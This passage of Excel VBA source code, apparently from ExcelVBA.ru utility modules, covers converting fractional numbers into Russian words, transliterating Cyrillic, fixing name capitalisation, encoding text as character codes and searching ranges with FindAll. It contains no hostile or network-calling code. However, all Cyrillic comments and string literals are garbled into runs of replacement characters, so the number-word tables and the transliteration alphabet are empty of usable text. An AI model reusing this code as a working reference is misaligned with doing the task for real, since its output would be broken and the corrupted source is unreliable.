                Else        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd|
                    num = Mid(chislo2, Start, 1) * 10
                    sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    scl2 = ""
                End If
            Case 10        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                num = Mid(chislo2, Start, 1) * 1
                sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclonMlrd = Mid(chislo2, Start, 1) * 1
                '-------------------------------------------------------
            Case 9        ' - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                num = Mid(chislo2, Start, 1) * 100
                sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                scl2 = ""
            Case 8        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                num = Mid(chislo2, Start, 2) * 1
                If num >= 1 And num <= 20 Then        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
                    sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon1000000 = Mid(chislo2, Start, 2) * 1
                    sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    If Right(sclon1000000, 1) * 1 = 0 Then sclon1000000 = 0        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  20
                    Start = Start + 1
                    x = x - 1
                Else        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd|
                    num = Mid(chislo2, Start, 1) * 10
                    sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    scl2 = ""
                End If
            Case 7        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                num = Mid(chislo2, Start, 1) * 1
                sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclon1000000 = Mid(chislo2, Start, 1) * 1
                sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                '-------------------------------------------------------
            Case 6        ' -  |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                num = Mid(chislo2, Start, 1) * 100
                sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                scl2 = ""
                If num <> 0 And Mid(chislo2, Start + 1, 1) = "0" _
                   And Mid(chislo2, Start + 2, 1) = "0" _
                   Then        '|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|,
                    sclon1000 = 0        '|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| sclon |fffd||fffd||fffd||fffd||fffd|
                    x = x - 2        ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                    Start = Start + 2        ' |fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd|
                End If
            Case 5        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                num = Mid(chislo2, Start, 2) * 1
                If (num >= 1 And num <= 20) Or (num <> 0 And Right(num, 1) * 1 = 0) Then        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
                    sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon1000 = Mid(chislo2, Start, 2) * 1
                    If Right(sclon1000, 1) * 1 = 0 Then sclon1000 = 0        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                    Start = Start + 1
                    x = x - 1
                Else        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd|
                    num = Mid(chislo2, Start, 1) * 10
                    sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    scl2 = ""
                End If
            Case 4        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                If Mid(chislo2, Start, 1) * 1 = 0 Then        '|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| sclon1000
                    num = Mid(chislo2, Start, 1) * 1
                    sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    scl2 = ""
                Else        ' -|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| sclon
                    num = Mid(chislo2, Start, 1) * 1
                    sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon1000 = Mid(chislo2, Start, 1) * 1
                End If
                '-------------------------------------------------------
            Case 3        ' - |fffd||fffd||fffd||fffd||fffd|
                num = Mid(chislo2, Start, 1) * 100
                sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                scl2 = ""
            Case 2        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                num = Mid(chislo2, Start, 2) * 1
                If (num >= 1 And num <= 20) Or (num <> 0 And Right(num, 1) * 1 = 0) Then        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
                    sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Start = Start + 1
                    x = x - 1
                Else        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd|
                    num = Mid(chislo2, Start, 1) * 10
                    sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                End If
            Case 1        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                num = Mid(chislo2, Start, 1) * 1
                sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclon1000000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                sclonMlrd = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        End Select
        '-------------------------------------------------------
        Call ConvertNumToText(num, txt, x, txt2, chislo3)
        '-------------------------------------------------------
        If sclon1000 <> -1 Then
            Select Case sclon1000
                Case 1: scl = "|fffd||fffd||fffd||fffd||fffd||fffd|"
                Case 2 To 4: scl = "|fffd||fffd||fffd||fffd||fffd||fffd|"
                Case 5 To 19: scl = "|fffd||fffd||fffd||fffd||fffd|"
                Case 0: scl = "|fffd||fffd||fffd||fffd||fffd|"
            End Select
            scl2 = scl & " "
        End If
        If sclon1000000 <> -1 Then
            Select Case sclon1000000
                Case 1: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                Case 2 To 4: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                Case 5 To 19: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                Case 0: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            End Select
            scl2 = scl & " "
        End If
        If sclonMlrd <> -1 Then
            Select Case sclonMlrd
                Case 1: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                Case 2 To 4: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                Case 5 To 19: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                Case 0: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            End Select
            scl2 = scl & " "
        End If
        tekst = tekst & txt2 & scl2
    Next x

    ' <<<|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| <<<
    If Len(chislo3$) Then
        If Right(chislo2, 1) = "1" Then tekst = tekst & " |fffd||fffd||fffd||fffd||fffd| " Else tekst = tekst & " |fffd||fffd||fffd||fffd||fffd| "

        LengthChislo = Len(chislo3) - 2
        ' - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 1, |fffd|.|fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|. ",003"
        chislo3 = Right(chislo3, LengthChislo)
        Start = 0
        For x = LengthChislo To 1 Step -1        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            Start = Start + 1        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            '<<<<<<<<
            Select Case x
                Case 4        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    num = Mid(chislo3, Start, 1) * 1000
                    'sclon10000 = -1
                    sclon1000 = -1
                    sclon100 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon10 = -1
                    scl2 = ""
                Case 3        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    num = Mid(chislo3, Start, 1) * 100
                    'sclon10000 = -1
                    sclon1000 = -1
                    sclon100 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    sclon10 = -1
                    scl2 = ""
                Case 2        ' - |fffd||fffd||fffd||fffd||fffd|
                    num = Mid(chislo3, Start, 2) * 1
                    If (num >= 1 And num <= 20) Or (num <> 0 And Right(num, 1) * 1 = 0) Then        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
                        If LengthChislo = 3 Then
                            sclon1000 = num
                        Else: sclon1000 = -1
                        End If
                        If LengthChislo = 2 Then
                            sclon100 = num
                        Else: sclon100 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        End If
                        If LengthChislo = 1 Then
                            sclon10 = num
                        Else: sclon10 = -1
                        End If
                        Start = Start + 1
                        x = x - 1
                    Else        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd|
                        num = Mid(chislo3, Start, 1) * 10
                        sclon1000 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        sclon100 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        sclon10 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    End If
                Case 1        ' - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    num = Mid(chislo3, Start, 1) * 1
                    If LengthChislo = 3 Then
                        sclon1000 = num
                    Else: sclon1000 = -1
                    End If
                    If LengthChislo = 2 Then
                        sclon100 = num
                    Else: sclon100 = -1        '- |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    End If
                    If LengthChislo = 1 Then
                        sclon10 = num
                    Else: sclon10 = -1
                    End If
            End Select
            '-------------------------------------------------------
            Call ConvertNumToText(num, txt, x, txt2, chislo3)
            '-------------------------------------------------------
            If sclon1000 <> -1 Then
                Select Case sclon1000
                    Case 1: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                    Case Else: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                End Select
                scl2 = scl & " "
            End If
            If sclon100 <> -1 Then
                Select Case sclon100
                    Case 1: scl = "|fffd||fffd||fffd||fffd||fffd|"
                    Case Else: scl = "|fffd||fffd||fffd||fffd||fffd|"
                End Select
                scl2 = scl & " "
            End If
            If sclon10 <> -1 Then
                Select Case sclon10
                    Case 1: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                    Case Else: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                End Select
                scl2 = scl & " "
            End If
            If Len(chislo3) = 4 Then
                Select Case Right(chislo3, 1)
                    Case 1: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                    Case Else: scl = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                End Select
                scl2 = scl & " "
            End If
            If TextFractionPart Then tekst = tekst & txt2 & scl2
        Next x
    End If
    If Not TextFractionPart Then tekst = tekst & IIf(chislo3 <> "0", chislo3, "") & " " & scl2
    FractionalNumberToText = Application.Trim(tekst)
End Function

Sub ConvertNumToText(num, txt, x, txt2, chislo3)
    Select Case num
        Case 0: txt = "|fffd||fffd||fffd||fffd|"
        Case 1: txt = "|fffd||fffd||fffd||fffd|"
            If x = 4 Or (chislo3 <> 0 And x = 1) Then txt = "|fffd||fffd||fffd||fffd|"        ' (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)
        Case 2: txt = "|fffd||fffd||fffd|"
            If x = 4 Or (chislo3 <> 0 And x = 1) Then txt = "|fffd||fffd||fffd|"        ' (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)
        Case 3: txt = "|fffd||fffd||fffd|"
        Case 4: txt = "|fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 5: txt = "|fffd||fffd||fffd||fffd|"
        Case 6: txt = "|fffd||fffd||fffd||fffd||fffd|"
        Case 7: txt = "|fffd||fffd||fffd||fffd|"
        Case 8: txt = "|fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 9: txt = "|fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 10: txt = "|fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 11: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 12: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 13: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 14: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 15: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 16: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 17: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 18: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 19: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 20: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 30: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 40: txt = "|fffd||fffd||fffd||fffd||fffd|"
        Case 50: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 60: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 70: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 80: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 90: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 100: txt = "|fffd||fffd||fffd|"
        Case 200: txt = "|fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 300: txt = "|fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 400: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 500: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 600: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 700: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 800: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Case 900: txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End Select
    If txt <> "" Then txt2 = txt & " " Else txt2 = txt
End Sub


Function Translit(ByVal txt As String) As String        ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd| 2013 EducatedFool  http://excelvba.ru/code/translit
    txtRussian$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    arrTranslit = Array("", "a", "b", "v", "g", "d", "e", "e", "zh", "z", "i", "y", "k", _
                        "l", "m", "n", "o", "p", "r", "s", "t", "u", "f", "kh", "ts", "tch", _
                        "sh", "sch", "", "y", "", "e", "yu", "ya")
    For iCount% = 1 To 33
        txt$ = Replace(txt$, Mid(txtRussian$, iCount%, 1), arrTranslit(iCount%), , , vbBinaryCompare)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        txt$ = Replace(txt$, UCase(Mid(txtRussian$, iCount%, 1)), UCase(arrTranslit(iCount%)), , , vbBinaryCompare)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Next
    Translit$ = txt$
End Function

Function RepairFIOcase(ByVal FIO$) As String
    On Error Resume Next
    If FIO$ = "" Then Exit Function
    Dim arr, w$
    arr = Split(FIO$)
    For i = LBound(arr) To UBound(arr)
        w = Left(arr(i), 2)
        If (Len(w) = 2) And (w Like "[|fffd|-|7e8|][|fffd|-|7e8|]") Then
            If InStr(1, w, UCase$(w), vbBinaryCompare) = 1 Then arr(i) = UCase$(arr(i))
        End If
    Next i
    RepairFIOcase = Trim(Join(arr))
End Function
Attribute VB_Name = "mod_CommonFunctions"
'---------------------------------------------------------------------------------------
' Module        : mod_CommonFunctions
' |fffd||fffd||fffd||fffd||fffd|     : EducatedFool  (|fffd||fffd||fffd||fffd||fffd|)                    |fffd||fffd||fffd||fffd|: 26.03.2012
' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| Excel, Word, CorelDRAW. |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: http://ExcelVBA.ru/payments
'---------------------------------------------------------------------------------------
Option Compare Text
Option Private Module

Function Chars(ByVal txt As String) As Variant
    On Error Resume Next: ReDim arr(0 To Len(txt) - 1)
    For i = LBound(arr) To UBound(arr): arr(i) = Mid(txt, i + 1, 1): Next i
    If Err Then Chars = Array() Else Chars = arr
End Function

Function SafeText(ByVal txt As String) As String
    For i = 1 To Len(txt)
        SafeText = SafeText & IIf(i = 1, "", "-") & AscW(Mid(txt, i, 1))
    Next i
End Function

Function RestoreText(ByVal txt As String) As String
    On Error Resume Next: arr = Split(txt, "-")
    For i = LBound(arr) To UBound(arr): arr(i) = ChrW(Val(arr(i))): Next i
    RestoreText = Join(arr, "")
End Function

Function TemplatesInfo(ByVal files As Collection)
    For Each item In files
        TemplatesInfo = TemplatesInfo & ";" & TemplateType(item)
    Next
    TemplatesInfo = Left(Mid(TemplatesInfo, 2), 100)
End Function

Function ColunmNameByColumnNumber(ByVal col As Long) As String
    resA1 = Application.ConvertFormula("=r1c" & col, xlR1C1, xlA1)
    ColunmNameByColumnNumber = col & " |fffd|" & Split(resA1, "$")(1) & "|fffd|"
End Function

Function FindAll(SearchRange As Range, _
                 FindWhat As Variant, _
                 Optional LookIn As XlFindLookIn = xlValues, _
                 Optional LookAt As XlLookAt = xlWhole, _
                 Optional SearchOrder As XlSearchOrder = xlByRows, _
                 Optional MatchCase As Boolean = False, _
                 Optional BeginsWith As String = vbNullString, _
                 Optional EndsWith As String = vbNullString, _
                 Optional BeginEndCompare As VbCompareMethod = vbTextCompare) As Range

    Dim FoundCell As Range, FirstFound As Range, LastCell As Range, rngResultRange As Range
    Dim XLookAt As XlLookAt, Include As Boolean, CompMode As VbCompareMethod
    Dim Area As Range, MaxRow As Long, MaxCol As Long, BeginB As Boolean, EndB As Boolean

    CompMode = BeginEndCompare
    XLookAt = LookAt: If BeginsWith <> vbNullString Or EndsWith <> vbNullString Then XLookAt = xlPart

   For Each Area In SearchRange.Areas
        With Area
            If .Cells(.Cells.Count).Row > MaxRow Then MaxRow = .Cells(.Cells.Count).Row
            If .Cells(.Cells.Count).Column > MaxCol Then MaxCol = .Cells(.Cells.Count).Column
        End With
    Next Area
    Set LastCell = SearchRange.Worksheet.Cells(MaxRow, MaxCol)
    Set FoundCell = SearchRange.Find(what:=FindWhat, after:=LastCell, _
                                     LookIn:=LookIn, LookAt:=XLookAt, _
                                     SearchOrder:=SearchOrder, MatchCase:=MatchCase)

    If Not FoundCell Is Nothing Then
        Set FirstFound = FoundCell
        Do Until False    ' Loop forever. We'll "Exit Do" when necessary.
           Include = False
            If BeginsWith = vbNullString And EndsWith = vbNullString Then
                Include = True
            Else
                If BeginsWith <> vbNullString Then
                    If StrComp(Left(FoundCell.Text, Len(BeginsWith)), _
                               BeginsWith, BeginEndCompare) = 0 Then Include = True
                End If
                If EndsWith <> vbNullString Then
                    If StrComp(Right(FoundCell.Text, Len(EndsWith)), _
                               EndsWith, BeginEndCompare) = 0 Then Include = True
                End If
            End If
            If Include = True Then
                If rngResultRange Is Nothing Then
                    Set rngResultRange = FoundCell
                Else
                    Set rngResultRange = Application.Union(rngResultRange, FoundCell)
                End If
            End If
            Set FoundCell = SearchRange.FindNext(after:=FoundCell)
            If (FoundCell Is Nothing) Then Exit Do
            If (FoundCell.Address = FirstFound.Address) Then Exit Do
        Loop
    End If
    Set FindAll = rngResultRange
End Function

Attribute VB_Name = "mod_Documents"
'---------------------------------------------------------------------------------------
' Module        : mod_Documents
' Author        : EducatedFool                     Date: 05.06.2014
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text
Option Private Module
Public StopMacro As Boolean, WA As Object, Main_PI As ProgressIndicator
